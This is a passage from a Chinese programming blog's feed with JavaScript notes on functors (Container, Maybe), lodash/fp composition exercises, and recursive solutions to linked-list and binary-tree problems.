class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Container</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>            <span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span>x <span class="token operator">=</span><span class="token operator">></span> x <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span>            <span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span>x <span class="token operator">=</span><span class="token operator">></span> x <span class="token operator">*</span> x<span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// Container { _value: 36 }</span></code></pre><p>为了简化可以增加静态方法（静态方法：既可以通过类调用，也可以通过实例对象调用）</p><pre class=" language-js"><code class="language-js"><span class="token keyword">class</span> <span class="token class-name">Container</span> <span class="token punctuation">{</span>  <span class="token keyword">static</span> <span class="token keyword">of</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Container</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span>  <span class="token punctuation">}</span>  <span class="token function">constructor</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>_value <span class="token operator">=</span> value  <span class="token punctuation">}</span>  <span class="token function">map</span><span class="token punctuation">(</span>fn<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> Container<span class="token punctuation">.</span><span class="token keyword">of</span><span class="token punctuation">(</span><span class="token function">fn</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>_value<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">// 取值</span>  <span class="token function">value</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token keyword">return</span> <span class="token function">f</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>_value<span class="token punctuation">)</span>  <span class="token punctuation">}</span>  <span class="token punctuation">}</span></code></pre><p>为了处理参数为null和undefined的情况</p><pre class=" language-js"><code class="language-js"><span class="token keyword">class</span> <span class="token class-name">Maybe</span> <span class="token punctuation">{</span>  <span class="token keyword">static</span> <span class="token keyword">of</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Maybe</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span>  <span class="token punctuation">}</span>  <span class="token function">isNothing</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>_value <span class="token operator">===</span> <span class="token keyword">null</span> <span class="token operator">||</span> <span class="token keyword">this</span><span class="token punctuation">.</span>_value <span class="token operator">===</span>undefined  <span class="token punctuation">}</span>  <span class="token function">constructor</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>_value <span class="token operator">=</span> x  <span class="token punctuation">}</span>  <span class="token function">map</span><span class="token punctuation">(</span>fn<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">isNothing</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token keyword">this</span> <span class="token punctuation">:</span> Maybe<span class="token punctuation">.</span><span class="token keyword">of</span><span class="token punctuation">(</span><span class="token function">fn</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>_value<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>应用</p><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">// 把美元转换成人民币</span><span class="token keyword">const</span> toRMB <span class="token operator">=</span> s <span class="token operator">=</span><span class="token operator">></span> Functor<span class="token punctuation">.</span><span class="token keyword">of</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span>v <span class="token operator">=</span><span class="token operator">></span> v<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">'$'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span>parseFloat<span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span>v <span class="token operator">=</span><span class="token operator">></span> v <span class="token operator">*</span> <span class="token number">7</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span>v <span class="token operator">=</span><span class="token operator">></span> v<span class="token punctuation">.</span><span class="token function">toFixed</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">value</span><span class="token punctuation">(</span>v <span class="token operator">=</span><span class="token operator">></span> <span class="token string">'￥'</span> <span class="token operator">+</span> v<span class="token punctuation">)</span><span class="token comment" spellcheck="true">// ...</span></code></pre><h2 id="几道习题"><a href="#几道习题" class="headerlink" title="几道习题"></a>几道习题</h2><pre class=" language-js"><code class="language-js"><span class="token keyword">const</span> fp <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'lodash/fp'</span><span class="token punctuation">)</span><span class="token keyword">const</span> cars <span class="token operator">=</span> <span class="token punctuation">[</span>  <span class="token punctuation">{</span> name<span class="token punctuation">:</span> <span class="token string">'Ferrari FF'</span><span class="token punctuation">,</span> horsepower<span class="token punctuation">:</span> <span class="token number">660</span><span class="token punctuation">,</span> dollar_value<span class="token punctuation">:</span> <span class="token number">700000</span><span class="token punctuation">,</span> in_stock<span class="token punctuation">:</span> <span class="token boolean">true</span> <span class="token punctuation">}</span><span class="token punctuation">,</span>  <span class="token punctuation">{</span> name<span class="token punctuation">:</span> <span class="token string">'Spyker C12 Zagato'</span><span class="token punctuation">,</span> horsepower<span class="token punctuation">:</span> <span class="token number">650</span><span class="token punctuation">,</span> dollar_value<span class="token punctuation">:</span> <span class="token number">648000</span><span class="token punctuation">,</span> in_stock<span class="token punctuation">:</span> <span class="token boolean">false</span> <span class="token punctuation">}</span><span class="token punctuation">,</span>  <span class="token punctuation">{</span> name<span class="token punctuation">:</span> <span class="token string">'Jaguar XKR-S'</span><span class="token punctuation">,</span> horsepower<span class="token punctuation">:</span> <span class="token number">550</span><span class="token punctuation">,</span> dollar_value<span class="token punctuation">:</span> <span class="token number">132000</span><span class="token punctuation">,</span> in_stock<span class="token punctuation">:</span> <span class="token boolean">false</span> <span class="token punctuation">}</span><span class="token punctuation">,</span>  <span class="token punctuation">{</span> name<span class="token punctuation">:</span> <span class="token string">'Audi R8'</span><span class="token punctuation">,</span> horsepower<span class="token punctuation">:</span> <span class="token number">525</span><span class="token punctuation">,</span> dollar_value<span class="token punctuation">:</span> <span class="token number">114200</span><span class="token punctuation">,</span> in_stock<span class="token punctuation">:</span><span class="token boolean">false</span> <span class="token punctuation">}</span><span class="token punctuation">,</span>  <span class="token punctuation">{</span> name<span class="token punctuation">:</span> <span class="token string">'Aston Martin One-77'</span><span class="token punctuation">,</span> horsepower<span class="token punctuation">:</span> <span class="token number">750</span><span class="token punctuation">,</span> dollar_value<span class="token punctuation">:</span> <span class="token number">1850000</span><span class="token punctuation">,</span> in_stock<span class="token punctuation">:</span> <span class="token boolean">true</span> <span class="token punctuation">}</span><span class="token punctuation">,</span>  <span class="token punctuation">{</span> name<span class="token punctuation">:</span> <span class="token string">'Pagani Huaya'</span><span class="token punctuation">,</span> horsepower<span class="token punctuation">:</span> <span class="token number">700</span><span class="token punctuation">,</span> dollar_value<span class="token punctuation">:</span> <span class="token number">1300000</span><span class="token punctuation">,</span> in_stock<span class="token punctuation">:</span> <span class="token boolean">false</span> <span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token comment" spellcheck="true">// 练习1，使用函数组合fp.flowRight()重新实现下面这个函数</span><span class="token comment" spellcheck="true">// let isLastInStock = function (cars) {</span><span class="token comment" spellcheck="true">//   // 获取最后一条数据</span><span class="token comment" spellcheck="true">//   let last_car = fp.last(cars)</span><span class="token comment" spellcheck="true">//   // 获取 in_stock 属性值</span><span class="token comment" spellcheck="true">//   return fp.prop('in_stock', last_car)</span><span class="token comment" spellcheck="true">// }</span><span class="token keyword">let</span> isLastInStock <span class="token operator">=</span> fp<span class="token punctuation">.</span><span class="token function">flowRight</span><span class="token punctuation">(</span>fp<span class="token punctuation">.</span><span class="token function">prop</span><span class="token punctuation">(</span><span class="token string">'in_stock'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> fp<span class="token punctuation">.</span>last<span class="token punctuation">)</span><span class="token comment" spellcheck="true">// 练习2：使用fp.flowRight(),fp.prop(),fp.first()获取第一个car的name</span><span class="token keyword">let</span> isFirstName <span class="token operator">=</span> fp<span class="token punctuation">.</span><span class="token function">flowRight</span><span class="token punctuation">(</span>fp<span class="token punctuation">.</span><span class="token function">prop</span><span class="token punctuation">(</span><span class="token string">'name'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> fp<span class="token punctuation">.</span>first<span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">isFirstName</span><span class="token punctuation">(</span>cars<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">// 练习3：使用帮助函数_average重构averageDollarValue，使用函数组合的方式实现</span><span class="token keyword">let</span> _average <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>xs<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">return</span> fp<span class="token punctuation">.</span><span class="token function">reduce</span><span class="token punctuation">(</span>fp<span class="token punctuation">.</span>add<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> xs<span class="token punctuation">)</span> <span class="token operator">/</span> xs<span class="token punctuation">.</span>length<span class="token punctuation">}</span><span class="token comment" spellcheck="true">// 原代码</span><span class="token comment" spellcheck="true">// let averageDollarValue = function (cars) {</span><span class="token comment" spellcheck="true">//   // dollar_values 为保存价格的数组</span><span class="token comment" spellcheck="true">//   let dollar_values = fp.map(function (car) {</span><span class="token comment" spellcheck="true">//     return car.dollar_value</span><span class="token comment" spellcheck="true">//   }, cars)</span><span class="token comment" spellcheck="true">//   return _average(dollar_values)</span><span class="token comment" spellcheck="true">// }</span><span class="token comment" spellcheck="true">// 改进</span><span class="token keyword">let</span> averageDollarValue <span class="token operator">=</span> fp<span class="token punctuation">.</span><span class="token function">flowRight</span><span class="token punctuation">(</span>_average<span class="token punctuation">,</span> fp<span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token function">averageDollarValue</span><span class="token punctuation">(</span>car <span class="token operator">=</span><span class="token operator">></span> car<span class="token punctuation">.</span>dollar_value<span class="token punctuation">,</span> cars<span class="token punctuation">)</span><span class="token comment" spellcheck="true">// 练习4：使用flowRight写一个sanitizeNames()函数，返回一个</span><span class="token comment" spellcheck="true">// 下划线连接的小写字符串，把数组中的name转换成这种形式，</span><span class="token comment" spellcheck="true">// sanitizeNames(["Hello World"]) => ["hello_world"]</span><span class="token keyword">let</span> _underscore <span class="token operator">=</span> fp<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex">/\W+/g</span><span class="token punctuation">,</span><span class="token string">'_'</span><span class="token punctuation">)</span><span class="token keyword">let</span> sanitizeNames <span class="token operator">=</span> fp<span class="token punctuation">.</span><span class="token function">flowRight</span><span class="token punctuation">(</span>_underscore<span class="token punctuation">,</span> fp<span class="token punctuation">.</span>toLower<span class="token punctuation">)</span></code></pre><pre class=" language-js"><code class="language-js"><span class="token keyword">const</span> fp <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'lodash/fp'</span><span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">Container</span> <span class="token punctuation">{</span>  <span class="token keyword">static</span> <span class="token keyword">of</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Container</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span>  <span class="token punctuation">}</span>  <span class="token function">constructor</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>_value <span class="token operator">=</span> value  <span class="token punctuation">}</span>  <span class="token function">map</span><span class="token punctuation">(</span>fn<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> Container<span class="token punctuation">.</span><span class="token keyword">of</span><span class="token punctuation">(</span><span class="token function">fn</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>_value<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">Maybe</span> <span class="token punctuation">{</span>  <span class="token keyword">static</span> <span class="token keyword">of</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Maybe</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span>  <span class="token punctuation">}</span>  <span class="token function">isNothing</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>_value <span class="token operator">===</span> <span class="token keyword">null</span> <span class="token operator">||</span> <span class="token keyword">this</span><span class="token punctuation">.</span>_value <span class="token operator">===</span>undefined  <span class="token punctuation">}</span>  <span class="token function">constructor</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>_value <span class="token operator">=</span> x  <span class="token punctuation">}</span>  <span class="token function">map</span><span class="token punctuation">(</span>fn<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">isNothing</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token keyword">this</span> <span class="token punctuation">:</span> Maybe<span class="token punctuation">.</span><span class="token keyword">of</span><span class="token punctuation">(</span><span class="token function">fn</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>_value<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// 练习1：使用fp.add(x,y)和fp.map(f,x)创建一个能让functor里的值增加的函数ex1</span><span class="token keyword">let</span> maybe <span class="token operator">=</span> Maybe<span class="token punctuation">.</span><span class="token keyword">of</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">let</span> ex1 <span class="token operator">=</span> arr <span class="token operator">=</span><span class="token operator">></span> fp<span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span>item <span class="token operator">=</span><span class="token operator">></span> fp<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>item<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> arr<span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>maybe<span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span>ex1<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">// Maybe { _value: [ 6, 7, 2 ] }</span><span class="token comment" spellcheck="true">// 练习2：实现一个函数ex2，能够使用fp.first获取列表的第一个元素</span><span class="token keyword">let</span> xs <span class="token operator">=</span> Container<span class="token punctuation">.</span><span class="token keyword">of</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'do'</span><span class="token punctuation">,</span> <span class="token string">'ray'</span><span class="token punctuation">,</span> <span class="token string">'me'</span><span class="token punctuation">,</span> <span class="token string">'fa'</span><span class="token punctuation">,</span> <span class="token string">'so'</span><span class="token punctuation">,</span> <span class="token string">'la'</span><span class="token punctuation">,</span> <span class="token string">'ti'</span><span class="token punctuation">,</span> <span class="token string">'do'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">let</span> ex2 <span class="token operator">=</span> arr <span class="token operator">=</span><span class="token operator">></span> fp<span class="token punctuation">.</span><span class="token function">first</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>xs<span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span>ex2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">// 练习3：实现一个函数ex3，使用safeProp和fp.first找到user的名字的首字母</span><span class="token keyword">let</span> safeProp <span class="token operator">=</span> fp<span class="token punctuation">.</span><span class="token function">curry</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span>x<span class="token punctuation">,</span> o<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">return</span> Maybe<span class="token punctuation">.</span><span class="token keyword">of</span><span class="token punctuation">(</span>o<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token keyword">let</span> user <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token string">'id'</span><span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">'name'</span><span class="token punctuation">:</span> <span class="token string">'Albert'</span> <span class="token punctuation">}</span><span class="token keyword">let</span> ex3 <span class="token operator">=</span> obj <span class="token operator">=</span><span class="token operator">></span> <span class="token function">safeProp</span><span class="token punctuation">(</span><span class="token string">'name'</span><span class="token punctuation">)</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span>fp<span class="token punctuation">.</span>first<span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">ex3</span><span class="token punctuation">(</span>user<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">// 练习4：使用maybe重写ex4，不要有if语句</span><span class="token comment" spellcheck="true">// let ex4 = function (n) {</span><span class="token comment" spellcheck="true">//   if (n) {</span><span class="token comment" spellcheck="true">//     return parseInt(n)</span><span class="token comment" spellcheck="true">//   }</span><span class="token comment" spellcheck="true">// }</span><span class="token keyword">let</span> ex4 <span class="token operator">=</span> n <span class="token operator">=</span><span class="token operator">></span> Maybe<span class="token punctuation">.</span><span class="token keyword">of</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span>n <span class="token operator">=</span><span class="token operator">></span> <span class="token function">parseInt</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 函数式编程 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>递归</title>
      <link href="2020/08/03/%E7%AE%97%E6%B3%95-%E9%80%92%E5%BD%92/"/>
      <url>2020/08/03/%E7%AE%97%E6%B3%95-%E9%80%92%E5%BD%92/</url>
      
        <content type="html"><![CDATA[<ul><li>合并有序链表</li><li>最长公共子序列与最长公共子串</li><li>相同的树</li><li>判断二叉树是否对称</li><li>求二叉树深度</li><li>有序数组转二叉搜索树</li></ul><h2 id="合并有序链表（递归）"><a href="#合并有序链表（递归）" class="headerlink" title="合并有序链表（递归）"></a>合并有序链表（递归）</h2><p>将两个升序链表合并为一个新的 升序 链表并返回。新链表是通过拼接给定的两个链表的所有节点组成的。 </p><blockquote><p>输入：1-&gt;2-&gt;4, 1-&gt;3-&gt;4</p><p>输出：1-&gt;1-&gt;2-&gt;3-&gt;4-&gt;4</p></blockquote><p>递归思想：比较第一个值，取小的，依次递归</p><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> mergeTwoLists <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span>l1<span class="token punctuation">,</span> l2<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>l1<span class="token operator">==</span><span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token keyword">return</span> l2    <span class="token keyword">if</span><span class="token punctuation">(</span>l2<span class="token operator">==</span><span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token keyword">return</span> l1    <span class="token keyword">if</span><span class="token punctuation">(</span>l1<span class="token punctuation">.</span>val<span class="token operator">&lt;=</span>l2<span class="token punctuation">.</span>val<span class="token punctuation">)</span><span class="token punctuation">{</span>        l1<span class="token punctuation">.</span>next <span class="token operator">=</span> <span class="token function">mergeTwoLists</span><span class="token punctuation">(</span>l1<span class="token punctuation">.</span>next<span class="token punctuation">,</span>l2<span class="token punctuation">)</span>        <span class="token keyword">return</span> l1    <span class="token punctuation">}</span> <span class="token keyword">else</span><span class="token punctuation">{</span>        l2<span class="token punctuation">.</span>next <span class="token operator">=</span> <span class="token function">mergeTwoLists</span><span class="token punctuation">(</span>l1<span class="token punctuation">,</span>l2<span class="token punctuation">.</span>next<span class="token punctuation">)</span>        <span class="token keyword">return</span> l2    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><h2 id="最长公共子序列和最长公共子串"><a href="#最长公共子序列和最长公共子串" class="headerlink" title="最长公共子序列和最长公共子串"></a>最长公共子序列和最长公共子串</h2><blockquote><p>A:”helloworld”    B=”loop”<br>最长公共子序列:loo<br>最长公共子串 ：lo （必须连续）</p><p>最长公共子序列：<br> 输入: X=x1x2…xn, Y=y1y2…ym,  输出: X和Y的LCS<br> 定义: c[i][j] = Xi,Yj的LCS长度(OSP) </p></blockquote><p><img src="https://s2.ax1x.com/2020/03/06/3btMhq.png" alt="3btMhq.png"></p><blockquote><p>最长公共子串类似<br>xi=yj，c[i][j]=c[i-1][j-1]+1，很显然，当比对的位字符一样时，能得到该状态转移方程。<br>xi≠yj，c[i][j]=0，说明无论之前有没有连续的子串，到了这个不相等的位置会直接断掉，所以c[i][j]=0;</p></blockquote><h2 id="相同的树"><a href="#相同的树" class="headerlink" title="相同的树"></a>相同的树</h2><blockquote><p>给定两个二叉树，编写一个函数来检验它们是否相同。</p><p>如果两个树在结构上相同，并且节点具有相同的值，则认为它们是相同的。</p><p>示例 1:</p><p>输入:  1         1<br>          / \       / \<br>         2   3     2   3</p><p>[1,2,3],   [1,2,3]</p><p>输出: true<br>示例 2:</p><p>输入: 1          1<br>          /           \<br>         2             2</p><p>[1,2],     [1,null,2]</p><p>输出: false<br>示例 3:</p><p>输入:  1         1<br>          / \       / \<br>         2   1     1   2</p><p>  [1,2,1],   [1,1,2]</p><p>输出: false</p></blockquote><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> isSameTree <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> q<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>p <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> q<span class="token operator">==</span><span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">true</span>    <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>p<span class="token operator">==</span><span class="token keyword">null</span><span class="token operator">&amp;&amp;</span>q<span class="token operator">!==</span><span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span>p<span class="token operator">!==</span><span class="token keyword">null</span><span class="token operator">&amp;&amp;</span>q<span class="token operator">==</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">false</span>    <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span>val<span class="token operator">!==</span>q<span class="token punctuation">.</span>val<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">false</span>    <span class="token keyword">else</span> <span class="token keyword">return</span> <span class="token function">isSameTree</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span>left<span class="token punctuation">,</span>q<span class="token punctuation">.</span>left<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isSameTree</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span>right<span class="token punctuation">,</span>q<span class="token punctuation">.</span>right<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><h2 id="判断二叉树是否对称"><a href="#判断二叉树是否对称" class="headerlink" title="判断二叉树是否对称"></a>判断二叉树是否对称</h2><blockquote><p>给定一个二叉树，检查它是否是镜像对称的。</p><p>例如，二叉树 [1,2,2,3,4,4,3] 是对称的。</p><p>​    1</p><p>   / \<br>  2   2<br> / \ / \<br>3  4 4  3</p><p>但是下面这个 [1,2,2,null,3,null,3] 则不是镜像对称的:</p><p>​    1</p><p>   / \<br>  2   2<br>   \   \<br>   3    3</p></blockquote><ul><li>和上题类似，把根节点拿掉，就是判断两个树的关系</li></ul><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> isSymmetric <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>root <span class="token operator">===</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">true</span>    <span class="token keyword">var</span> p <span class="token operator">=</span> root<span class="token punctuation">.</span>left    <span class="token keyword">var</span> q <span class="token operator">=</span> root<span class="token punctuation">.</span>right    <span class="token keyword">function</span> <span class="token function">fn</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span>q<span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>p<span class="token operator">==</span><span class="token keyword">null</span><span class="token operator">&amp;&amp;</span>q<span class="token operator">==</span><span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">true</span>        <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>p<span class="token operator">!==</span><span class="token keyword">null</span><span class="token operator">&amp;&amp;</span>q<span class="token operator">==</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token punctuation">(</span>p<span class="token operator">==</span><span class="token keyword">null</span><span class="token operator">&amp;&amp;</span>q<span class="token operator">!==</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">false</span>        <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span>val<span class="token operator">!==</span>q<span class="token punctuation">.</span>val<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">false</span>        <span class="token keyword">else</span> <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token function">fn</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span>left<span class="token punctuation">,</span>q<span class="token punctuation">.</span>right<span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token function">fn</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span>right<span class="token punctuation">,</span>q<span class="token punctuation">.</span>left<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token function">fn</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span>q<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><h2 id="求二叉树深度"><a href="#求二叉树深度" class="headerlink" title="求二叉树深度"></a>求二叉树深度</h2><blockquote><p>给定一个二叉树，找出其最大深度。</p><p>二叉树的深度为根节点到最远叶子节点的最长路径上的节点数。</p><p>说明: 叶子节点是指没有子节点的节点。</p><p>示例：<br>给定二叉树 [3,9,20,null,null,15,7]，</p><p>​    3</p><p>   / \<br>  9  20<br>    /  \<br>   15   7<br>返回它的最大深度 3 。</p></blockquote><ul><li>递归思想</li></ul><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> maxDepth <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>root<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span>    <span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token keyword">let</span> left <span class="token operator">=</span> <span class="token function">maxDepth</span><span class="token punctuation">(</span>root<span class="token punctuation">.</span>left<span class="token punctuation">)</span>        <span class="token keyword">let</span> right <span class="token operator">=</span> <span class="token function">maxDepth</span><span class="token punctuation">(</span>root<span class="token punctuation">.</span>right<span class="token punctuation">)</span>        <span class="token keyword">return</span> Math<span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span>left<span class="token 